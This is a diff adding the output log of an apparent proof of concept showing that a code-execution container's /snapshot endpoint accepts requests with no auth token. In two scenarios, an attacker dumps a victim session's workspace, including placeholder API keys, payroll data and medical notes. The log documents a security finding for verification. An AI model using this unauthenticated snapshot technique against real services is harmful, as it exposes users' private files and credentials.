@@ -1,0 +1,104 @@
+=== shim: tfshim v0.3.18 with the shim: block of code-execution-environment/tinfoil-config.yml
+production shim block from /root/.claude/jobs/632f70ea/tmp/work/verify3-L2-cee-snapshot-auth-bypass-poc/src/cee/tinfoil-config.yml -> {'upstream-port': 8000, 'paths': ['/exec', '/read', '/write', '/snapshot', '/restore', '/sync-uploads/manifest', '/sync-uploads/blobs', '/health']}
+local-only additions -> {'listen-port': 28443, 'tls-mode': 'self-signed', 'hpke-key-file': '/root/.claude/jobs/632f70ea/tmp/work/verify3-L2-cee-snapshot-auth-bypass-poc/poc/out/shim/hpke_key.json', 'cache-dir': '/root/.claude/jobs/632f70ea/tmp/work/verify3-L2-cee-snapshot-auth-bypass-poc/poc/out/shim/cache'}
+
+################ Scenario A: attacker dumps an active session's workspace with no token
+[A] executor   pid=93926 Uid: 1000 1000 1000 1000 Gid: 1000 1000 1000 1000 Groups:  CapEff: 00000000000000c0 
+[A] api-server pid=93939 Uid: 1000 1000 1000 1000 Gid: 1000 1000 1000 1000 Groups:  CapEff: 0000000000000000 
+
+--- [orchestrator, victim token] /restore the chat's previous (decrypted) workspace -> container stays 'warm'
+{"status":"ok"}
+  -> HTTP 200
+--- [attacker, no token] /snapshot while warm
+{"error":"cannot snapshot a warm container"}  -> HTTP 410
+--- [orchestrator, victim token] /sync-uploads: the user's attached file (first user-driven call -> 'active')
+{"missing":[{"filename":"payroll.csv","sha256":"4865d2126450858ed77b2653ca5d0d076b4de1f6667ef66f8ed7ff4c407e2618"}]}
+  -> HTTP 200
+{"written":1}
+  -> HTTP 200
+--- [orchestrator, victim token] /exec (model's bash, runs as uid 1001 in /workspace)
+{"stdout":"total 20\ndrwxrwxrwt  5 root     root     4096 Oct  7 18:33 .\ndrwxr-xr-x 10 root     root     4096 Oct  7 18:33 ..\ndrwxr-xr-x  2 bashuser bashuser 4096 Oct  7 18:33 analysis\ndrwxr-xr-x  2 executor executor 4096 Oct  7 18:33 notes\ndrwxr-xr-x  2 executor executor 4096 Oct  7 18:33 prev_session\n","stderr":"","exit_code":0}
+  -> HTTP 200
+--- [orchestrator, victim token] /write
+{"path":"/workspace/.env","size":37}
+  -> HTTP 200
+
+--- [attacker] every user-driven path is gated by the token:
+/read                    no token     {"error":"missing container auth token"}  -> HTTP 401
+/exec                    no token     {"error":"missing container auth token"}  -> HTTP 401
+/write                   no token     {"error":"missing container auth token"}  -> HTTP 401
+/restore                 no token     {"error":"missing container auth token"}  -> HTTP 401
+/sync-uploads/manifest   no token     {"error":"missing container auth token"}  -> HTTP 401
+/read                    wrong token  {"error":"container auth token mismatch"}  -> HTTP 403
+
+--- [attacker, no token, no body] POST /snapshot
+HTTP 200, 11618 bytes
+HTTP/2 200 
+content-type: application/json
+date: Wed, 07 Oct 2026 18:33:45 GMT
+tinfoil-pt: https://tinfoil.sh/predicate/dummy/v2
+trailer: X-Snapshot-Status
+
+x-snapshot-status: ok
+[file] .env (37 bytes, uid=1000)
+         | OPENAI_API_KEY=sk-live-VICTIM-SECRET
+[dir ] analysis
+[file] analysis/payroll.csv (35 bytes, uid=1001)
+         | name,salary
+         | alice,123456
+         | bob,98765
+[file] analysis/ran_as.txt (60 bytes, uid=1001)
+         | uid=1001(bashuser) gid=1001(bashuser) groups=1001(bashuser)
+[file] analysis/summary.txt (38 bytes, uid=1001)
+         | median salary: 111,110 (do not share)
+[dir ] notes
+[file] notes/medical_record.txt (60 bytes, uid=1000)
+         | Patient: Jane Doe
+         | DOB: 1980-02-03
+         | Diagnosis: <confidential>
+[dir ] prev_session
+[file] prev_session/model_notes.md (85 bytes, uid=1000)
+         | # notes from an earlier turn of this chat
+         | user asked to analyse their payroll export
+
+--- [orchestrator, victim token] next tool call and the eviction snapshot after the attack
+{"error":"container session ended"}  -> HTTP 410
+{"error":"container session ended"}  -> HTTP 410
+api-server log (A):
+launch: started /api-server pid=93939 in /root/.claude/jobs/632f70ea/tmp/work/verify3-L2-cee-snapshot-auth-bypass-poc/rootfs (uid=1000 gid=1000 ambient=[])
+2026/10/07 18:33:44 api server listening on :8000
+2026/10/07 18:33:44 api-server: gating /snapshot — cannot snapshot a warm container (410)
+2026/10/07 18:33:44 api-server: gating /read — missing container auth token (401)
+2026/10/07 18:33:44 api-server: gating /exec — missing container auth token (401)
+2026/10/07 18:33:45 api-server: gating /write — missing container auth token (401)
+2026/10/07 18:33:45 api-server: gating /restore — missing container auth token (401)
+2026/10/07 18:33:45 api-server: gating /sync-uploads/manifest — missing container auth token (401)
+2026/10/07 18:33:45 api-server: gating /read — container auth token mismatch (403)
+2026/10/07 18:33:45 api-server: gating /exec — container session ended (410)
+2026/10/07 18:33:45 api-server: gating /snapshot — container session ended (410)
+
+################ Scenario B: same dump, overlapped with the orchestrator's eviction snapshot (session never disturbed)
+[B] executor   pid=94043 Uid: 1000 1000 1000 1000 Gid: 1000 1000 1000 1000 Groups:  CapEff: 00000000000000c0 
+[B] api-server pid=94056 Uid: 1000 1000 1000 1000 Gid: 1000 1000 1000 1000 Groups:  CapEff: 0000000000000000 
+{"status":"ok"}
+  -> HTTP 200
+{"stdout":"fcc88d8cad08ffe82595080bc26c2e9005925c5d2b29d9e294b35d40f8991f22  data/big_dataset.bin\n","stderr":"","exit_code":0}
+  -> HTTP 200
+--- attacker starts /snapshot (no token) and holds it open; orchestrator evicts 2s later
+[orchestrator] t= 2.01s eviction POST /snapshot (no token, as the orchestrator does) -- attacker request still open
+[orchestrator] HTTP 200, 128008202 bytes
+[orchestrator] t= 2.24s eviction snapshot finished; attacker still running: yes
+HTTP/1.1 200 OK
+Trailer: X-Snapshot-Status
+X-Snapshot-Status: ok
+[attacker] t= 0.05s HTTP 200 (no X-Code-Execution-Container-Auth-Token sent)
+[attacker] t= 0.05s read first 1048576 bytes, now stalling 6.0s with the request still open
+[attacker] t= 7.25s done, 128008202 bytes total
+[orchestrator copy] 4 files: data/big_dataset.bin:96000000B:fcc88d8cad08ffe8, notes/medical_record.txt:60B:4b34eba625e911ed, prev_session/model_notes.md:85B:8fa0b65821311a9e, report.md:26B:eabb6b4da29582ed
+[attacker copy]     4 files: data/big_dataset.bin:96000000B:fcc88d8cad08ffe8, notes/medical_record.txt:60B:4b34eba625e911ed, prev_session/model_notes.md:85B:8fa0b65821311a9e, report.md:26B:eabb6b4da29582ed
+--- container state afterwards (expected 'killed' after a normal eviction):
+{"error":"container session ended"}  -> HTTP 410
+api-server log (B):
+launch: started /api-server pid=94056 in /root/.claude/jobs/632f70ea/tmp/work/verify3-L2-cee-snapshot-auth-bypass-poc/rootfs (uid=1000 gid=1000 ambient=[])
+2026/10/07 18:33:45 api server listening on :8000
+2026/10/07 18:33:55 api-server: gating /exec — container session ended (410)
